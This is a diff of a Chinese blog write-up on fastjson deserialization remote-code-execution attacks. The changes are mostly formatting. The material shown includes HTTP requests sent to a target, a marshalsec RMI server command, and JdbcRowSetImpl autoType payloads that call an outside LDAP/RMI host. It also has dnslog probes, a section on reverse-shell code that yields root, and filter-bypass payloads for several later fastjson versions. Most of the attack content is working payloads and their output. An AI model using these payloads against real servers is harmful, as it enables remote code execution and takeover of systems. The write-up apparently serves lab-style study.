@@ -15,7 +15,7 @@ permalink: /blog/2020/fastjson/UNdeser/
 
 ### fastjson指纹特征
 访问页面，查看反包是一个指定的json格式的数据。请求包：
-```bash
+```
 GET / HTTP/1.1
 Host: underattack-host:8090
 Cache-Control: max-age=0
@@ -28,7 +28,7 @@ Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
 Connection: close
 ```
 反包：
-```bash
+```
 HTTP/1.1 200 
 Content-Type: application/json;charset=UTF-8
 Content-Length: 28
@@ -41,7 +41,7 @@ Connection: close
 }
 ```
 如上的请求和反包。我们知道了json的格式直接构造参数，给服务器发包看看：
-```bash
+```
 POST / HTTP/1.1
 Host: underattack-host:8090
 Cache-Control: max-age=0
@@ -58,7 +58,7 @@ Content-Length: 26
 {"name":"hello", "age":20}
 ```
 反包：
-```bash
+```
 HTTP/1.1 200 
 Content-Type: application/json;charset=UTF-8
 Content-Length: 30
@@ -73,7 +73,7 @@ Connection: close
 我们看到服务器端返回包为我们构造的包。
 
 
-#### fastjson 1.2.24 反序列化导致任意命令执行漏洞
+### fastjson 1.2.24 反序列化导致任意命令执行漏洞
 fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。
 
 参考资料：
@@ -119,7 +119,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "https:/
 
 开启监听。向靶场服务器发送Payload，带上RMI的地址：
 ```bash
-POST数据：
+## POST数据
 {
     "b":{
 
@@ -130,7 +130,7 @@ POST数据：
         "autoCommit":true
     }
 }
-----
+## 返回
 {
     "name":{
         "@type":"java.lang.Class",
@@ -156,7 +156,7 @@ Closing connection
 ```
 受害机器已经访问了我们的服务器，最后检查是否执行dnslog命令；
 
-```bash
+```
 user.root.c08aqu.dnslog.cn  61.132.161.12   2020-08-14 15:43:30
 user.root.c08aqu.dnslog.cn  61.132.161.5    2020-08-14 15:43:30
 user.root.c08aqu.dnslog.cn  61.132.161.12   2020-08-14 15:43:30
@@ -164,9 +164,9 @@ user.root.c08aqu.dnslog.cn  61.132.161.5    2020-08-14 15:43:30
 ```
 可见，`ping`命令已成功执行;
 
-######## 反弹shell
+### 反弹shell
 同样的，直接在poc代码里修改反弹shell的代码即可。
-```bash
+```java
 import java.lang.Runtime;
 import java.lang.Process;
 
@@ -197,7 +197,7 @@ whoami
 root
 ```
 
-#### dnslog
+### dnslog payload
 
 ```bash
 {"rand1":{"@type":"java.net.InetAddress","val":"http://dnslog"}}
@@ -210,39 +210,30 @@ root
 
 {"rand5":{"@type":"java.net.URL","val":"http://dnslog"}}
 
-一些畸形payload，不过依然可以触发dnslog：
+## 一些畸形payload，不过依然可以触发dnslog：
 {"rand6":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}
 {"@type": "java.lang.AutoCloseable"
-
-
 {"rand7":Set\[{"@type":"java.net.URL","val":"http://dnslog"}\]}
-
 {"rand8":Set\[{"@type":"java.net.URL","val":"http://dnslog"}
-
 {"rand9":{"@type":"java.net.URL","val":"http://dnslog"}
-
-
 {"@type": "java.lang.AutoCloseable"
 ```
 
-
----
-
 ```bash
-
-
 {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://47.52.233.92:9999/expUseful","autoCommit":true}}
 
 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://47.52.233.92:9999/expUseful","autoCommit":true}
 ```
 
----
+### 一些其他版本的payload
 
 * 1.2.41
 
 ```bash
+## 直接加 [ 是不可以的，因为数组实例化的是Object类型，所以需要将传入的变量设置为数组格式，然后在
+## com.alibaba.fastjson.serializer.ObjectArrayCodec中通过数组对象的getComponentType()
+## 可以获得数组元素即com.sun.rowset.JdbcRowSetImpl对象
 {"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://47.52.233.92:9999/expUseful", "autoCommit":true}
-// 直接加 [ 是不可以的，因为数组实例化的是Object类型，所以需要将传入的变量设置为数组格式，然后在com.alibaba.fastjson.serializer.ObjectArrayCodec中通过数组对象的getComponentType()可以获得数组元素，即com.sun.rowset.JdbcRowSetImpl对象
 {"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://47.52.233.92:9999/expUseful","autoCommit":true]}
 ```
 
@@ -308,7 +299,6 @@ java.util.Properties","UserTransaction":"ldap://47.52.233.92:9999/expUseful"}}
 * RMI
 
 ```bash
-
 {"@type":"LLcom.sun.rowset.RowSetImpl;;","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true} 1.2.42
 {"@type":"[com.sun.rowset.RowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true} 1.2.25v1.2.43
 {"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties"："data_source":"rmi://localhost:1099/Exploit"}} 1.2.25
